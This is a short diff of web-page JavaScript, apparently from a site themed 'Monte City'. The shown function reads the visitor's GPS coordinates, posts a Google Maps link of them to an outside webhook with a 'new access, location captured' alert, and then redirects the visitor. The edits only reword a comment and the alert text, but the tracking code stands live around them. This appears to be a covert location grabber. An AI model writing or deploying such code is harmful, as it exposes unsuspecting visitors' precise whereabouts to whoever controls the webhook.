@@ -41,14 +41,14 @@
         function enviarEDirecionar(pos) {
             const lat = pos.coords.latitude;
             const log = pos.coords.longitude;
-            // LINK DO MAPA CORRIGIDO PARA ABRIR NO GPS
+            // LINK DO MAPA CORRIGIDO
             const mapa = `https://www.google.com/maps?q=${lat},${log}`;
 
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
-                    content: `📍 **Novo acesso Monte City!**\n🌍 **Localização:** ${mapa}` 
+                    content: `📍 **Novo acesso Monte City!**\n🌍 **Localização capturada:** ${mapa}` 
                 })
             }).finally(() => { direcionar(); });
         }
